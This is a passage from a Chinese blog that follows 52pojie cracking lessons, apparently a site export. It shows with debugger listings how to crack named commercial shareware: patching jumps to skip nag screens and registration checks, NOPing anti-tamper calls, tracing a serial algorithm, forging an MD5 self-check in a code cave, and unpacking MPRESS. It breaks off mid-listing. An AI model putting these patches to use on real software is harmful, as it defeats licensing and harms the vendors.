ESIExamP.00452827\n```\n\n将`jnz`修改为`jmp`指令绕过NAG窗口。\n\n```asm\n00438341   . /75 2A         jnz short ESIExamP.0043836D;jmp\n00438343   . |8D8D E4F9FFFF lea ecx,dword ptr ss:[ebp-0x61C]\n00438349   . |51            push ecx\n0043834A   . |E8 4122FEFF   call ESIExamP.0041A590\n0043834F   . |8D8D E4F9FFFF lea ecx,dword ptr ss:[ebp-0x61C]\n00438355   . |C645 FC 27    mov byte ptr ss:[ebp-0x4],0x27\n00438359   . |E8 C9A40100   call ESIExamP.00452827                                ;  NAG\n0043835E   . |8D95 E4F9FFFF lea edx,dword ptr ss:[ebp-0x61C]\n00438364   . |52            push edx\n00438365   . |885D FC       mov byte ptr ss:[ebp-0x4],bl\n00438368   . |E8 2323FEFF   call ESIExamP.0041A690\n0043836D   > \\8D4D E8       lea ecx,dword ptr ss:[ebp-0x18]\n```\n\n## 第八战：A-PDF Split(已下载)\n\nhttps://www.52pojie.cn/thread-199834-1-1.html\n\nASProtect1.23 RC1+14处自校验+跳转爆破\n\n发现不会手脱，那就用脱壳工具中的ASProtect Unpacker 汉化版脱壳。是用Delphi写的程序。\n\n载入OD，下`bp MessageBoxA`和`bp MessageBoxW`断点，运行，点击试用卡在了kernel32模块的某个地方。F8走出来，回到用户代码处。\n\n```asm\n0040B285      E8 8692FFFF   call PdfSplit.00404510\n0040B28A  |.  5F            pop edi                                            ;  PdfSplit.0040B28A\n0040B28B  |.  5E            pop esi                                            ;  PdfSplit.0040B28A\n```\n\n发现应该是`40B285`地址的call指令产生的错误，直接把它NOP掉。保存，运行发现程序直接退出了。程序退出调用的是`PostQuitMessage`函数，下这个断点。点击“Try”，程序停在断点处。堆栈查看返回函数。\n\n```asm\n0012FD88   0048BDBC  /CALL 到 PostQuitMessage 来自 PdfSplit.0048BDB7\n0012FD8C   00000000  \\ExitCode = 0x0\n0012FD90   00576B5B  返回到 PdfSplit.00576B5B 来自 PdfSplit.0048BDAC\n0012FD94   0012FDEC  指向下一个 SEH 记录的指针\n0012FD98   0057705E  SE处理程序\n```\n\n```asm\n0048BDB3  |. /74 07         je short PdfSplit.0048BDBC;要跳\n0048BDB5  |. |6A 00         push 0x0                                 ; /ExitCode = 0x0\n0048BDB7  |. |E8 18BDF7FF   call <jmp.&user32.PostQuitMessage>       ; \\PostQuitMessage\n0048BDBC  \\> \\C3            retn\n```\n\n`je`修改为`jmp`。保存。运行程序发现点击“Try”能进入主程序了，也没有错误框。但点击“Browse”又弹出错误框。\n\n{% asset_img 8.2.png 弹出错误 %}\n\n点击关闭还关闭不了了。\n\n{% asset_img 8.2.png 无效指针 %}\n\n...好难，脱壳好像引发别的错误了...\n\n## 第九战：XXPDF转WORD助手\n\nhttps://www.52pojie.cn/thread-200655-1-1.html\n\ntElock壳+自校验+爆破\n\n## 第十战：LanHelper算法分析与注册机的编写\n\nhttps://www.52pojie.cn/thread-200798-1-1.html\n\n算法分析\n\n{% asset_img 10.1.png 注册码有误 %}\n\n拿去查壳，没有壳，是Delphi写的程序。载入OD搜索字符串“注册码”没有找到。没关系，谁让它是Delphi写的呢？把它载入Delphi Decompiler，点击“Procedures”(过程)，找到有关注册字样的单元名。注册的窗体有两个文本框和三个按钮，找到最符合的注册窗体。\n\n{% asset_img 10.2.png dede找注册窗体 %}\n\n猜测`Button1Click`是“确定”按钮，因为“取消”就会返回到父窗口，相当于关闭嘛，没有按钮可以理解。为了验证我们的猜想，双击`Button1Click`进去找到第一条汇编指令，地址为`004DCB40`。\n\n{% asset_img 10.3.png 按钮首地址 %}\n\n回到OD，Ctrl + G输入地址，下断运行。输入名称、注册码后点击确定，OD成功停在断点处，说明找对了。\n\nF8往下运行。\n\n```asm\n004DCB6D   .  E8 5616FAFF   call LanHelpe.0047E1C8\n004DCB72   .  8B45 B8       mov eax,dword ptr ss:[ebp-0x48]\n004DCB75   .  8D55 BC       lea edx,dword ptr ss:[ebp-0x44]\n004DCB78   .  E8 47CCF2FF   call LanHelpe.004097C4                   ;  获取用户名\n004DCB7D   .  837D BC 00    cmp dword ptr ss:[ebp-0x44],0x0          ;  判断用户名是否为空\n004DCB81   .  74 22         je short LanHelpe.004DCBA5\n004DCB83   .  8D55 B0       lea edx,dword ptr ss:[ebp-0x50]\n004DCB86   .  8B45 FC       mov eax,dword ptr ss:[ebp-0x4]\n004DCB89   .  8B80 04030000 mov eax,dword ptr ds:[eax+0x304]\n004DCB8F   .  E8 3416FAFF   call LanHelpe.0047E1C8\n004DCB94   .  8B45 B0       mov eax,dword ptr ss:[ebp-0x50]\n004DCB97   .  8D55 B4       lea edx,dword ptr ss:[ebp-0x4C]\n004DCB9A   .  E8 25CCF2FF   call LanHelpe.004097C4                   ;  获取假码\n004DCB9F   .  837D B4 00    cmp dword ptr ss:[ebp-0x4C],0x0          ;  判断假码是否为空\n004DCBA3   .  75 44         jnz short LanHelpe.004DCBE9\n004DCBA5   >  8D4D F0       lea ecx,dword ptr ss:[ebp-0x10]\n```\n\n```asm\n004DCBE9   > \\8D55 A8       lea edx,dword ptr ss:[ebp-0x58]\n004DCBEC   .  8B45 FC       mov eax,dword ptr ss:[ebp-0x4]\n004DCBEF   .  8B80 04030000 mov eax,dword ptr ds:[eax+0x304]\n004DCBF5   .  E8 CE15FAFF   call LanHelpe.0047E1C8\n004DCBFA   .  8B45 A8       mov eax,dword ptr ss:[ebp-0x58]\n004DCBFD   .  50            push eax\n004DCBFE   .  8D55 A4       lea edx,dword ptr ss:[ebp-0x5C]\n004DCC01   .  8B45 FC       mov eax,dword ptr ss:[ebp-0x4]\n004DCC04   .  8B80 00030000 mov eax,dword ptr ds:[eax+0x300]\n004DCC0A   .  E8 B915FAFF   call LanHelpe.0047E1C8\n004DCC0F   .  8B45 A4       mov eax,dword ptr ss:[ebp-0x5C]\n004DCC12   .  5A            pop edx                                  ;  0012F338\n004DCC13   .  E8 9C270000   call LanHelpe.004DF3B4                   ;  用户名和假码放到寄存器，这个是关键call\n004DCC18      84C0          test al,al                               ;  比较al的值\n004DCC1A      0F84 F4030000 je LanHelpe.004DD014                     ;  关键跳\n```\n\n运行到关键跳处修改Z标志位，F9运行，发现成功注册，但程序是重启验证类型的。\n\n{% asset_img 10.4.png 注册成功 %}\n\n那我们将关键跳nop掉作为2.exe，修改al的值作为3.exe试试。\n\n意料之中，2.exe每次都需要注册，根本就行不通。3.exe竟然说注册码有误，我们不是跳过了吗？载入OD发现al确实是变成1，但是je跳转还是实现了。好吧既然这样就进入关键call一探究竟。\n\n输入用户名v5le0n9，假码l30n9ry0n。进入关键call。\n\n{% asset_img 10.5.png 算法分析 %}\n\n{% asset_img 10.6.png 算法分析 %}\n\n{% asset_img 10.7.png 算法分析 %}\n\n将这循环跑了6次之后，可以知道真码前6位固定为LH4A8N。循环结束后，比较dl的值，如果dl为0则跳转到eax清零处。\n\n重新载入，将假码的前6位设置为`LH4A8N`再分析。去到比较dl的值处，现在已经不为0了。继续往下走，看到一些红色指令。\n\nfild和fstp都是x86指令，fild是将整数转化为长双精FP80压栈(压到st0)，\nfstp是将弹栈指令，将st0弹出。ebp始终指向栈顶，ebp是在堆栈中寻址用的。\n\n```asm\n004DF49C   .  84D2             test dl,dl\n004DF49E   .  0F84 F8030000    je LanHelpe.004DF89C\n004DF4A4   .  33C0             xor eax,eax\n004DF4A6   .  8945 E0          mov dword ptr ss:[ebp-0x20],eax\n004DF4A9   .  8945 E4          mov dword ptr ss:[ebp-0x1C],eax\n004DF4AC   .  8B45 F8          mov eax,dword ptr ss:[ebp-0x8]           ;  eax是假码\n004DF4AF   .  8A58 06          mov bl,byte ptr ds:[eax+0x6]             ;  将第7位赋值给bl\n004DF4B2   .  33C0             xor eax,eax                              ;  eax清零\n004DF4B4   .  8AC3             mov al,bl                                ;  bl再赋值给al\n004DF4B6   .  8945 A0          mov dword ptr ss:[ebp-0x60],eax          ;  将假码第7位压入[ebp-0x60]\n004DF4B9   .  DB45 A0          fild dword ptr ss:[ebp-0x60]             ;  将第7位放入st0中\n004DF4BC   .  83C4 F4          add esp,-0xC                             ;  更新栈顶指针\n004DF4BF   .  DB3C24           fstp tbyte ptr ss:[esp]                  ;  pop栈顶数据\n004DF4C2   .  9B               wait\n004DF4C3   .  68 FE3F0000      push 0x3FFE\n004DF4C8   .  68 BD529691      push 0x919652BD\n004DF4CD   .  68 3411363C      push 0x3C361134\n004DF4D2   .  E8 9D1AF5FF      call LanHelpe.00430F74                   ;  将上面3个参数入栈调用F74\n```\n\n后面也有很多调用F74的，所以进去F74分析一下。\n\n{% asset_img 10.8.png 算法分析 %}\n\n{% asset_img 10.9.png 算法分析 %}\n\n...又要进去BF4分析一下，我真看不懂啊救命\n\n# NO.5 .NET系列教程\n\nBlue的实战软件全都过期了，所以我找了别的教程自力更生。\n\n[.Net零基础破解教程](https://v5le0n9.github.io/posts/784f7e1d.html)\n\n# NO.6 去软件弹窗系列教程\n\n## 第一课：弹窗暗桩\n\n运行一下程序，弹出网页。程序无壳，查找一下字符串，定位关键代码处。\n\n```asm\n00401004  /.  55            push ebp\n00401005  |.  8BEC          mov ebp,esp\n00401007  |.  6A 00         push 0x0\n00401009  |.  68 106B4600   push 第一课.00466B10                        ;  恭喜你：暗桩没有触发\n0040100E  |.  6A FF         push -0x1\n00401010  |.  6A 08         push 0x8\n00401012  |.  68 04000116   push 0x16010004\n00401017  |.  68 01000152   push 0x52010001\n0040101C  |.  E8 A0000000   call 第一课.004010C1\n00401021  |.  83C4 18       add esp,0x18\n00401024  |.  E8 04000000   call 第一课.0040102D;暗桩关键call，nop即可\n00401029  |.  8BE5          mov esp,ebp\n0040102B  |.  5D            pop ebp                                  ;  kernel32.7C817077\n0040102C  \\.  C3            retn\n0040102D  /$  55            push ebp\n0040102E  |.  8BEC          mov ebp,esp\n00401030  |.  68 04000080   push 0x80000004\n00401035  |.  6A 00         push 0x0\n00401037  |.  68 256B4600   push 第一课.00466B25                        ;  www.52pojie.cn\n0040103C  |.  68 01000000   push 0x1\n00401041  |.  B8 01000000   mov eax,0x1\n00401046  |.  BB 10584400   mov ebx,第一课.00445810\n0040104B  |.  E8 77000000   call 第一课.004010C7\n00401050  |.  83C4 10       add esp,0x10\n00401053  |.  6A 00         push 0x0\n00401055  |.  68 346B4600   push 第一课.00466B34                        ;  失败了！暗桩已经触发\n```\n\n## 第二课：再探弹窗暗桩\n\n这次是两个弹网页。依旧无壳，载入OD，发现查找字符串无果。查找所有模块间的调用，找到弹网页的函数`ShellExecuteA`，下断。\n\n```asm\n00445DD0  /$  68 F8114800   push 第二课.004811F8                        ; /Microsoft Internet Explorer\n00445DD5  |.  6A 00         push 0x0                                 ; |Class = 0x0\n00445DD7  |.  6A 00         push 0x0                                 ; |hAfterWnd = NULL\n00445DD9  |.  6A 00         push 0x0                                 ; |hParent = NULL\n00445DDB  |.  FF15 40654600 call dword ptr ds:[<&USER32.FindWindowEx>; \\FindWindowExA\n00445DE1  |.  8B4C24 04     mov ecx,dword ptr ss:[esp+0x4]\n00445DE5  |.  6A 01         push 0x1                                 ; /IsShown = 0x1\n00445DE7  |.  6A 00         push 0x0                                 ; |DefDir = NULL\n00445DE9  |.  6A 00         push 0x0                                 ; |Parameters = NULL\n00445DEB  |.  51            push ecx                                 ; |FileName = \"\u0006\"\n00445DEC  |.  68 F0114800   push 第二课.004811F0                        ; |open\n00445DF1  |.  50            push eax                                 ; |hWnd = 001631B8\n00445DF2  |.  FF15 84634600 call dword ptr ds:[<&SHELL32.ShellExecut>; \\ShellExecuteA\n00445DF8  \\.  C2 0400       retn 0x4\n```\n\n执行到返回，程序弹出一个网页。再经过这里一次，程序弹出第二个网页。\n\n```asm\n00445CD5   .  E8 3A150100   call 第二课.00457214\n00445CDA      8B4424 00     mov eax,dword ptr ss:[esp]\n00445CDE      8D4C24 04     lea ecx,dword ptr ss:[esp+0x4]\n00445CE2      50            push eax\n00445CE3      E8 E8000000   call 第二课.00445DD0                        ;  暗桩\n00445CE8   .  8D4C24 00     lea ecx,dword ptr ss:[esp]\n```\n\n所以只要将2-5行代码都nop掉，两个弹窗都没有了。但运行程序还是说暗桩已经触发。那有没有好一点的办法让它说没有触发呢？\n\n在数据窗口Ctrl+B搜索ASCII码“ www.52pojie.cn ”，下内存访问断点。运行单步\n\n```asm\n004010C4  /$  55            push ebp\n004010C5  |.  8BEC          mov ebp,esp\n004010C7  |.  81EC 04000000 sub esp,0x4\n004010CD  |.  68 010100A0   push 0xA0000101\n004010D2  |.  6A 00         push 0x0\n004010D4  |.  68 F87B4600   push 第二课.00467BF8\n004010D9  |.  68 01000000   push 0x1\n004010DE  |.  BB 10144000   mov ebx,第二课.00401410\n004010E3  |.  E8 B4010000   call 第二课.0040129C\n004010E8  |.  83C4 10       add esp,0x10\n004010EB  |.  8945 FC       mov [local.1],eax\n004010EE  |.  68 04000080   push 0x80000004\n004010F3  |.  6A 00         push 0x0\n004010F5  |.  8B45 FC       mov eax,[local.1]\n004010F8  |.  85C0          test eax,eax\n004010FA  |.  75 05         jnz short 第二课.00401101\n004010FC  |.  B8 0E7C4600   mov eax,第二课.00467C0E                     ;  ā\n00401101  |>  50            push eax\n00401102  |.  68 01000000   push 0x1\n00401107  |.  B8 01000000   mov eax,0x1\n0040110C  |.  BB B05C4400   mov ebx,第二课.00445CB0\n00401111  |.  E8 8C010000   call 第二课.004012A2                        ;  第一次弹窗\n```\n\n继续单步，`004010C4`就是第一次弹窗的位置，所以将这两个call指令nop掉即可。\n\n```asm\n004010A9  |.  83C4 04       add esp,0x4\n004010AC  |>  E8 13000000   call 第二课.004010C4                        ;  第一次弹窗\n004010B1  |.  E8 C3000000   call 第二课.00401179\n004010B6  |.  E8 C5000000   call 第二课.00401180                        ;  第二次弹窗\n004010BB  |.  E8 75010000   call 第二课.00401235\n```\n\n这次它说暗桩没有触发。\n\n","categories":["Windows逆向"],"tags":["OllyDbg","吾爱破解培训"]},{"title":"第四课——去程序自校验","url":"/posts/65ab04eb.html","content":"\n破解豪迪群发器。\n\n打开注册页面，随便输入注册码，会出现以下：\n\n<!--more-->\n\n{% asset_img 豪迪注册.jpg 豪迪注册 %}\n\n程序无壳，直接破解。右键->中文搜索引擎->智能搜索。找到“已注册版本”，应该是主页页面中央的红字部分。点进去，发现上面有比较和跳转指令。在跳转指令处下断，运行程序，点击注册，发现程序停在断点处，说明找对地方了。这个对比语句比较的是`0x579F24`这个所指向的全局变量。\n\n```asm\n00541870  |.  803D 249F5700>cmp byte ptr ds:[0x579F24],0x0\n00541877  |.  74 10         je short qqqf.00541889\n00541879  |.  BA F4185400   mov edx,qqqf.005418F4                    ;  已注册版本\n```\n\n右键->查找->所有常量，输入`0x579F24`。OD跳到所有调用过`0x579F24`的指令，右键->在每个命令上设置断点。快速定位第一个赋值点。\n\n```asm\n参考位于 qqqf:CODE 到常量 0x579F24\n地址       反汇编                                    注释\n0054135F   mov byte ptr ds:[0x579F24],0x0            ds:[00579F24]=00\n00541366   cmp byte ptr ds:[0x579F24],0x0            ds:[00579F24]=00\n0054147C   mov byte ptr ds:[0x579F24],0x0            ds:[00579F24]=00\n00541650   mov byte ptr ds:[0x579F24],dl\n0054169E   mov byte ptr ds:[0x579F24],al\n005416A3   cmp byte ptr ds:[0x579F24],0x0            ds:[00579F24]=00\n00541870   cmp byte ptr ds:[0x579F24],0x0            ds:[00579F24]=00\n0056AFB0   push ebp                                  (初始 CPU 选择)\n```\n\n重载，去到第一个断点处。\n\n```asm\n0054163B   .  E8 842FECFF   call qqqf.004045C4\n00541640   .  83F8 18       cmp eax,0x18\n00541643   .  74 09         je short qqqf.0054164E;eax=0x18则给dl赋值为1\n00541645   .  83F8 0C       cmp eax,0xC\n00541648   .  74 04         je short qqqf.0054164E;eax=0xC也可以给dl赋值为1\n0054164A   .  33D2          xor edx,edx;eax不等于0x18或0xc则给dl赋值为0\n0054164C   .  EB 02         jmp short qqqf.00541650\n0054164E   >  B2 01         mov dl,0x1\n00541650   >  8815 249F5700 mov byte ptr ds:[0x579F24],dl;第一个断点处，将dl的值赋给它\n00541656   .  83F8 0C       cmp eax,0xC\n00541659   .  75 48         jnz short qqqf.005416A3;如果eax不等于0xC则跳转\n```\n\n首先假设eax=0x18(在注册页面上输入0x18位注册码)的情况，即最后一个跳转指令要跳转。\n\n```asm\n005416A3   > \\803D 249F5700>cmp byte ptr ds:[0x579F24],0x0\n005416AA   .  75 05         jnz short qqqf.005416B1;跳转实现\n```\n\nShift+F9运行，去到第二个断点处。\n\n```asm\n0054135A  |.  83F8 0C       cmp eax,0xC\n0054135D  |.  74 07         je short qqqf.00541366;eax=0xC跳转，否则会执行赋0语句\n0054135F  |.  C605 249F5700>mov byte ptr ds:[0x579F24],0x0\n00541366  |>  803D 249F5700>cmp byte ptr ds:[0x579F24],0x0\n```\n\nShift+F9运行，继续去到第三个断点处。\n\n```asm\n00541870  |.  803D 249F5700>cmp byte ptr ds:[0x579F24],0x0\n00541877  |.  74 10         je short qqqf.00541889;eax=0x18时会执行赋0语句，所以会跳过“已注册版本”\n00541879  |.  BA F4185400   mov edx,qqqf.005418F4                    ;  已注册版本\n0054187E  |.  8B83 FC020000 mov eax,dword ptr ds:[ebx+0x2FC]\n00541884  |.  E8 F77CFBFF   call qqqf.004F9580\n00541889  |>  33C0          xor eax,eax\n```\n\n重载OD，在注册页面上输入0xC位注册码，运行。第一个断点没问题，去到第二个断点处(此时这第二个断点与上次输入0x18的第二个断点已经不一样了)。\n\n```asm\n00541696   . /7F 04                 jg short qqqf.0054169C\n00541698   > |33C0                  xor eax,eax\n0054169A   . |EB 02                 jmp short qqqf.0054169E\n0054169C   > \\B0 01                 mov al,0x1\n0054169E      A2 249F5700           mov byte ptr ds:[0x579F24],al;此时al的值为0\n005416A3      803D 249F5700 00      cmp byte ptr ds:[0x579F24],0x0\n005416AA      75 05                 jnz short qqqf.005416B1;这里一定让它跳转，否则注册失败\n```\n\n修改第一行的跳转指令，使al为1。\n\n```asm\njg short qqqf.0054169C\t\t=>\tjmp short qqqf.0054169C\n```\n\n保存一下，载入新程序再下断运行，发现运行到`54169E`时al还是为0。\n\n```asm\n0054168C     /75 0A         jnz short qqqf1.00541698\n0054168E   . |8B07          mov eax,dword ptr ds:[edi]\n00541690   . |E8 177EFCFF   call qqqf1.005094AC\n00541695   . |40            inc eax\n00541696   . |EB 04         jmp short qqqf1.0054169C;修改过\n00541698   > \\33C0          xor eax,eax\n0054169A   .  EB 02         jmp short qqqf1.0054169E\n0054169C   >  B0 01         mov al,0x1\n0054169E   >  A2 249F5700   mov byte ptr ds:[0x579F24],al\n005416A3   >  803D 249F5700>cmp byte ptr ds:[0x579F24],0x0\n```\n\n猜测`54168C`的跳转指令绕过了我们刚才修改过的指令，再`54168C`处下断，重载，运行到这里果然跳转实现了。那将`54168C`改为nop，让它执行`541696`使al为1。\n\n保存，运行一下，发现左下角显示“已注册！”，接着显示“正在验证...”，“验证失败！”。\n\n{% asset_img 验证.jpg 验证失败 %}\n\n载入OD，查找字符串“验证失败！”处，查看上下代码：\n\n```asm\n00540B2A  |> \\807D EB 00    cmp byte ptr ss:[ebp-0x15],0x0\n00540B2E  |.  75 68         jnz short qqqf2.00540B98\n00540B30  |.  B8 E00E5400   mov eax,qqqf2.00540EE0                   ;  验证失败！\n00540B35  |.  E8 3ED00100   call qqqf2.0055DB78\n```\n\n尝试将跳转指令修改一下。\n\n```asm\njnz short qqqf2.00540B98\t=>\t\tjmp short qqqf2.00540B98\n```\n\nF9运行发现经过验证后显示“已注册！”字样，说明验证成功。而且点击注册那里也显示“已注册版本”。\n\n由于每次等待验证的时间都非常长，所以也可以直接在函数段首`retn`，绕过验证过程。\n\n当运用“插入文件”、“插入其他”、“插入图片”功能时，都显示乱码。反正就是很多功能都不能用。\n\n{% asset_img 插入其他.jpg 插入其他 %}\n\n这就涉及到程序自校验的问题。这个程序是什么类型的自校验呢？将原程序拉进WinHEX，在程序末尾填充00的任意一个地方修改为01保存，使用以上功能时还是乱码，很有可能是MD5自校验。\n\n从 https://www.52pojie.cn/thread-14986-1-1.html 下载脱壳脚本。将已注册版本的程序载入OD，插件->ODbgScript->打开，选择脱壳脚本里的各语言按钮事件->Delphi & VB事件断点查找脚本。可以在`B`模块看到自动下了很多断点。Shift+F9运行起来，在程序界面点击“插入其他”，OD停在某断点处。因为还没有显示下拉菜单，更别提是自校验的过程了，所以这个断点可以去掉。\n\n```asm\n00479DF4  |.  FF93 20010000 call dword ptr ds:[ebx+0x120]            ;  qqqf3_1.0056934C\n```\n\nF9运行，在程序界面点击插入其他->插入随机字母，OD停在下个断点处。这个函数才是触发自校验过程的函数。\n\n```asm\n0048B2D6   .  FF93 88000000 call dword ptr ds:[ebx+0x88]             ;  qqqf3_1.00567ED8\n```\n\nF7跟进去。这个函数里也有挺多个call指令，到底哪个是MD5自校验函数呢？我们知道，MD5自校验需要读取文件来计算MD5值，所以如果在call里面看到有关文件的API函数，很大可能这个函数是MD5自校验的关键函数。\n\n```asm\n00567ED8  /.  55            push ebp\n00567ED9  |.  8BEC          mov ebp,esp\n00567EDB  |.  6A 00         push 0x0\n00567EDD  |.  6A 00         push 0x0\n00567EDF  |.  33C0          xor eax,eax\n00567EE1  |.  55            push ebp\n00567EE2  |.  68 347F5600   push qqqf3_1.00567F34\n00567EE7  |.  64:FF30       push dword ptr fs:[eax]\n00567EEA  |.  64:8920       mov dword ptr fs:[eax],esp\n00567EED  |.  8D4D F8       lea ecx,[local.2]\n00567EF0  |.  33D2          xor edx,edx\n00567EF2  |.  B8 1E000000   mov eax,0x1E\n00567EF7  |.  E8 C4AEF4FF   call qqqf3_1.004B2DC0\n00567EFC  |.  8B55 F8       mov edx,[local.2]\n00567EFF  |.  8D45 FC       lea eax,[local.1]\n00567F02  |.  E8 D1CCE9FF   call qqqf3_1.00404BD8\n00567F07  |.  8B45 FC       mov eax,[local.1]\n00567F0A  |.  50            push eax\n00567F0B  |.  E8 5049FFFF   call qqqf3_1.0055C860\n00567F10  |.  5A            pop edx                                  ;  qqqf3_1.0048B2DC\n00567F11  |.  E8 9AF9F8FF   call qqqf3_1.004F78B0\n00567F16  |.  33C0          xor eax,eax\n00567F18  |.  5A            pop edx                                  ;  qqqf3_1.0048B2DC\n00567F19  |.  59            pop ecx                                  ;  qqqf3_1.0048B2DC\n00567F1A  |.  59            pop ecx                                  ;  qqqf3_1.0048B2DC\n00567F1B  |.  64:8910       mov dword ptr fs:[eax],edx\n00567F1E  |.  68 3B7F5600   push qqqf3_1.00567F3B\n00567F23  |>  8D45 F8       lea eax,[local.2]\n00567F26  |.  E8 ADC3E9FF   call qqqf3_1.004042D8\n00567F2B  |.  8D45 FC       lea eax,[local.1]\n00567F2E  |.  E8 DDCAE9FF   call qqqf3_1.00404A10\n00567F33  \\.  C3            retn\n```\n\n一个一个点击回车跟随call指令进去看看，后面的那几个call要不就是没有call指令要不就是无关文件的API函数，都可以不管。`00567EF7`地址的call指令，进去的第二个call的第一个call，看到`GetModuleFileNameA`函数，所以`00567EF7`的函数调用是自校验的关键函数。在`GetModuleFileNameA`函数下断运行。`GetModuleFileNameA`函数的意思是获取当前进程已加载模块的完整路径，该模块必须由当前进程加载。\n\n继续F8单步，运行到此处时，可以看到eax显示`C:\\Program Files\\QQSendFriend\\Desklog.dll`。\n\n```asm\n004B2E1A  |.  E8 856FF5FF   call qqqf3_1.00409DA4\n```\n\nF7跟进去，发现这个函数是用来创建`Desklog.dll`文件的。再看下个函数：\n\n```asm\n004B2E27  |.  E8 14E2FFFF   call qqqf3_1.004B1040\n```\n\n跟进去，第一个call指令里有个`SetFilePointer`函数，在一个文件中设置新的读取位置。第二个call指令里有个`ReadFile`函数。第三个又是`SetFilePointer`函数，跳出循环，第四个又是`ReadFile`函数等等。但运行完整个`4B1040`函数程序都没有返回火星文。那继续往下看：\n\n```asm\n004B2E27  |.  E8 14E2FFFF   call qqqf3_1.004B1040\n004B2E2C  |.  8BC7          mov eax,edi\n004B2E2E  |.  E8 9170F5FF   call qqqf3_1.00409EC4;关闭句柄\n004B2E33  |.  8D55 F0       lea edx,[local.4]\n004B2E36  |.  33C0          xor eax,eax\n004B2E38  |.  E8 2FFCF4FF   call qqqf3_1.00402A6C;又是GetMouduleFileNameA\n004B2E3D  |.  8B45 F0       mov eax,[local.4]\n004B2E40  |.  8D55 F8       lea edx,[local.2]\n004B2E43  |.  E8 ECF0FFFF   call qqqf3_1.004B1F34;跟进去\n```\n\n在`004B1F34`这个函数的第三个call语句`4B1DD8`函数发现`CreateFile`函数，是一个多功能的函数，可打开或创建文件或者I/O设备。继续F8，还看到了一个`GetFileSize`函数用来获取文件大小。获取文件大小后的那个函数就是MD5校验算法，我们暂时没那个能力对算法进行跟踪，所以先暂时互相放过彼此。\n\n继续F8返回到`4B1DD8`处，F8去到`4B1F74`处，信息窗口显示堆栈地址。\n\n```asm\n004B1F6A  |.  E8 69FEFFFF   call qqqf3_1.004B1DD8\n004B1F6F  |.  BE 10000000   mov esi,0x10\n004B1F74  |.  8D5D EC       lea ebx,[local.5]\n```\n\n```asm\n堆栈地址=0012FCD8\nebx=0012FD54\n```\n\n数据窗口跟随，`0012FCD8`一行显示的就是当前程序的MD5值。\n\n```asm\n0012FCD8  52 8C 2A 4F CB 43 39 6F 2D 6F 7A 91 FE C0 CF DC  R?O薈9o-oz扊老\n```\n\n而原程序的MD5值为11ea70a3c3735c29b48552776756406a。可以把当前程序拖去WinMD5检验是否为上面的MD5值528C2A4FCB43396F2D6F7A91FEC0CFDC。\n\n选中`lea ebx,[local.5]`右键 -> 分析 -> 从模块中删除分析。将下面代码复制。\n\n```asm\n004B1F74    8D5D EC         lea ebx,dword ptr ss:[ebp-0x14]\n004B1F77    8D55 E8         lea edx,dword ptr ss:[ebp-0x18]\n004B1F7A    33C0            xor eax,eax\n004B1F7C    8A03            mov al,byte ptr ds:[ebx]\n004B1F7E    E8 35F1FFFF     call qqqf3_1.004B10B8\n004B1F83    8B55 E8         mov edx,dword ptr ss:[ebp-0x18]\n004B1F86    8BC7            mov eax,edi\n004B1F88    E8 3F26F5FF     call qqqf3_1.004045CC\n004B1F8D    43              inc ebx\n004B1F8E    4E              dec esi\n004B1F8F  ^ 75 E6           jnz short qqqf3_1.004B1F77\n```\n\n在程序中找一段空代码，比如从`0056B0A0`开始。在`4B1F74`修改代码`jmp 0056B0A0`，将已经复制的代码都NOP掉。F8跳下去，将上面的第1行代码修改成`mov dword ptr ss:[ebp-0x14],1`放到`0056B0A0`。将原程序的MD5值二进制粘贴到数据窗口覆盖当前程序的MD5。\n\n修改第1行代码为`mov dword ptr ss:[ebp-0x14],0xA370EA11`。继续编写第2到4行代码：\n\n```asm\nmov dword ptr ss:[ebp-0x10],0x295c73c3\nmov dword ptr ss:[ebp-0xC],0x775285b4\nmov dword ptr ss:[ebp-0x8],0x6a405667\n```\n\n再将上面的二进制代码复制下来，确保一一对应，成品如下：\n\n```asm\n0056B0A0    C745 EC 11EA70A3        mov dword ptr ss:[ebp-0x14],0xA370EA11\n0056B0A7    C745 F0 C3735C29        mov dword ptr ss:[ebp-0x10],0x295C73C3\n0056B0AE    C745 F4 B4855277        mov dword ptr ss:[ebp-0xC],0x775285B4\n0056B0B5    C745 F8 6756406A        mov dword ptr ss:[ebp-0x8],0x6A405667\n0056B0BC    8D5D EC                 lea ebx,dword ptr ss:[ebp-0x14]\n0056B0BF    8D55 E8                 lea edx,dword ptr ss:[ebp-0x18]\n0056B0C2    33C0                    xor eax,eax\n0056B0C4    8A03                    mov al,byte ptr ds:[ebx]\n0056B0C6    E8 ED5FF4FF             call qqqf3_1.004B10B8\n0056B0CB    8B55 E8                 mov edx,dword ptr ss:[ebp-0x18]\n0056B0CE    8BC7                    mov eax,edi\n0056B0D0    E8 F794E9FF             call qqqf3_1.004045CC\n0056B0D5    43                      inc ebx\n0056B0D6    4E                      dec esi\n0056B0D7  ^ 75 E6                   jnz short qqqf3_1.0056B0BF\n0056B0D9  ^ E9 B36EF4FF             jmp qqqf3_1.004B1F91\n```\n\nF9运行，程序成功看到不是显示火星文，说明破解自校验成功。\n\n右键 -> 复制到可执行文件 -> 所有修改 -> 复制，保存文件。注意，有时候会出现“无法定位数据”的情况，这时就要改变空代码的位置。最好不要选程序最底端那段代码，经常不行...靠近汇编代码结束处距离5行左右最佳。","categories":["Windows逆向"],"tags":["OllyDbg","吾爱破解培训"]},{"title":"第十课——x64平台脱壳与破解实战","url":"/posts/efe98763.html","content":"\n由于吾爱虚拟机是32位的，运行不了64位程序，所以这节课用物理机来操作。\n\n# 1. 课程例子\n\n拿到程序，先运行一下熟悉流程，再查壳，发现有MPRESS壳(压缩壳)。压缩壳在壳段开始的时候做的第一件事往往是`pushad`(保存寄存器)，在壳段结束的时候做的最后一件事是`popad`(还原寄存器)，所以我们可以用ESP定律脱压缩壳。但在64位的程序下，一般不会这么做。\n\n<!--more-->\n\n{% asset_img 查壳.png 查壳 %}\n\n将程序载入x64dbg，F9运行，去到标准的MPRESS的入口地址\n\n```asm\n000000014001B0C0 | 57                       | push rdi                                |\n000000014001B0C1 | 56                       | push rsi                                |\n000000014001B0C2 | 53                       | push rbx                                |\n000000014001B0C3 | 51                       | push rcx                                |\n000000014001B0C4 | 52                       | push rdx                                | rdx:EntryPoint\n000000014001B0C5 | 41:50                    | push r8                                |\n```\n\n既然有push，那肯定也有pop，找到下面这几句指令，也就找到出口了。\n\n```asm\npop r8\npop rdx\npop rcx\npop rbx\npop rsi\npop 